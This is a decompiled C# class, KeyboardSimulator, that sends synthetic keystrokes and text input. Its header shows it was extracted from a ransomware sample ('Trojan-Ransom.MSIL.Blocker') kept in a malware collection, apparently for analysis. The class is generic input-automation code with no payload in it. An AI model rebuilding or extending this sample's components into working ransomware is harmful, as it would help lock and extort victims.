// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Services.InputSimulator.KeyboardSimulator
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using System;
using System.Collections.Generic;
using System.Threading;
using VanillaStub.Helpers.Services.InputSimulator.Native;

namespace VanillaStub.Helpers.Services.InputSimulator
{
  public class KeyboardSimulator : IKeyboardSimulator
  {
    private readonly IInputSimulator _inputSimulator;
    private readonly IInputMessageDispatcher _messageDispatcher;

    public KeyboardSimulator(IInputSimulator inputSimulator)
    {
      this._inputSimulator = inputSimulator != null ? inputSimulator : throw new ArgumentNullException(nameof (inputSimulator));
      this._messageDispatcher = (IInputMessageDispatcher) new WindowsInputMessageDispatcher();
    }

    internal KeyboardSimulator(
      IInputSimulator inputSimulator,
      IInputMessageDispatcher messageDispatcher)
    {
      if (inputSimulator == null)
        throw new ArgumentNullException(nameof (inputSimulator));
      if (messageDispatcher == null)
        throw new InvalidOperationException(string.Format("The {0} cannot operate with a null {1}. Please provide a valid {1} instance to use for dispatching {2} messages.", (object) typeof (KeyboardSimulator).Name, (object) typeof (IInputMessageDispatcher).Name, (object) typeof (INPUT).Name));
      this._inputSimulator = inputSimulator;
      this._messageDispatcher = messageDispatcher;
    }

    public IMouseSimulator Mouse => this._inputSimulator.Mouse;

    public IKeyboardSimulator KeyDown(VirtualKeyCode keyCode)
    {
      this.SendSimulatedInput(new InputBuilder().AddKeyDown(keyCode).ToArray());
      return (IKeyboardSimulator) this;
    }

    public IKeyboardSimulator KeyUp(VirtualKeyCode keyCode)
    {
      this.SendSimulatedInput(new InputBuilder().AddKeyUp(keyCode).ToArray());
      return (IKeyboardSimulator) this;
    }

    public IKeyboardSimulator KeyPress(VirtualKeyCode keyCode)
    {
      this.SendSimulatedInput(new InputBuilder().AddKeyPress(keyCode).ToArray());
      return (IKeyboardSimulator) this;
    }

    public IKeyboardSimulator KeyPress(params VirtualKeyCode[] keyCodes)
    {
      InputBuilder builder = new InputBuilder();
      this.KeysPress(builder, (IEnumerable<VirtualKeyCode>) keyCodes);
      this.SendSimulatedInput(builder.ToArray());
      return (IKeyboardSimulator) this;
    }

    public IKeyboardSimulator ModifiedKeyStroke(
      VirtualKeyCode modifierKeyCode,
      VirtualKeyCode keyCode)
    {
      this.ModifiedKeyStroke((IEnumerable<VirtualKeyCode>) new VirtualKeyCode[1]
      {
        modifierKeyCode
      }, (IEnumerable<VirtualKeyCode>) new VirtualKeyCode[1]
      {
        keyCode
      });
      return (IKeyboardSimulator) this;
    }

    public IKeyboardSimulator ModifiedKeyStroke(
      IEnumerable<VirtualKeyCode> modifierKeyCodes,
      VirtualKeyCode keyCode)
    {
      this.ModifiedKeyStroke(modifierKeyCodes, (IEnumerable<VirtualKeyCode>) new VirtualKeyCode[1]
      {
        keyCode
      });
      return (IKeyboardSimulator) this;
    }

    public IKeyboardSimulator ModifiedKeyStroke(
      VirtualKeyCode modifierKey,
      IEnumerable<VirtualKeyCode> keyCodes)
    {
      this.ModifiedKeyStroke((IEnumerable<VirtualKeyCode>) new VirtualKeyCode[1]
      {
        modifierKey
      }, keyCodes);
      return (IKeyboardSimulator) this;
    }

    public IKeyboardSimulator ModifiedKeyStroke(
      IEnumerable<VirtualKeyCode> modifierKeyCodes,
      IEnumerable<VirtualKeyCode> keyCodes)
    {
      InputBuilder builder = new InputBuilder();
      this.ModifiersDown(builder, modifierKeyCodes);
      this.KeysPress(builder, keyCodes);
      this.ModifiersUp(builder, modifierKeyCodes);
      this.SendSimulatedInput(builder.ToArray());
      return (IKeyboardSimulator) this;
    }

    public IKeyboardSimulator TextEntry(string text)
    {
      if (text.Length > int.MaxValue)
        throw new ArgumentException(string.Format("The text parameter is too long. It must be less than {0} characters.", (object) (uint) int.MaxValue), nameof (text));
      this.SendSimulatedInput(new InputBuilder().AddCharacters(text).ToArray());
      return (IKeyboardSimulator) this;
    }

    public IKeyboardSimulator TextEntry(char character)
    {
      this.SendSimulatedInput(new InputBuilder().AddCharacter(character).ToArray());
      return (IKeyboardSimulator) this;
    }

    public IKeyboardSimulator Sleep(int millsecondsTimeout)
    {
      Thread.Sleep(millsecondsTimeout);
      return (IKeyboardSimulator) this;
    }

    public IKeyboardSimulator Sleep(TimeSpan timeout)
    {
      Thread.Sleep(timeout);
      return (IKeyboardSimulator) this;
    }

    private void ModifiersDown(InputBuilder builder, IEnumerable<VirtualKeyCode> modifierKeyCodes)
    {
      if (modifierKeyCodes == null)
        return;
      foreach (VirtualKeyCode modifierKeyCode in modifierKeyCodes)
        builder.AddKeyDown(modifierKeyCode);
    }

    private void ModifiersUp(InputBuilder builder, IEnumerable<VirtualKeyCode> modifierKeyCodes)
    {
      if (modifierKeyCodes == null)
        return;
      Stack<VirtualKeyCode> virtualKeyCodeStack = new Stack<VirtualKeyCode>(modifierKeyCodes);
      while (virtualKeyCodeStack.Count > 0)
        builder.AddKeyUp(virtualKeyCodeStack.Pop());
    }

    private void KeysPress(InputBuilder builder, IEnumerable<VirtualKeyCode> keyCodes)
    {
      if (keyCodes == null)
        return;
      foreach (VirtualKeyCode keyCode in keyCodes)
        builder.AddKeyPress(keyCode);
    }

    private void SendSimulatedInput(INPUT[] inputList) => this._messageDispatcher.DispatchInput(inputList);
  }
}
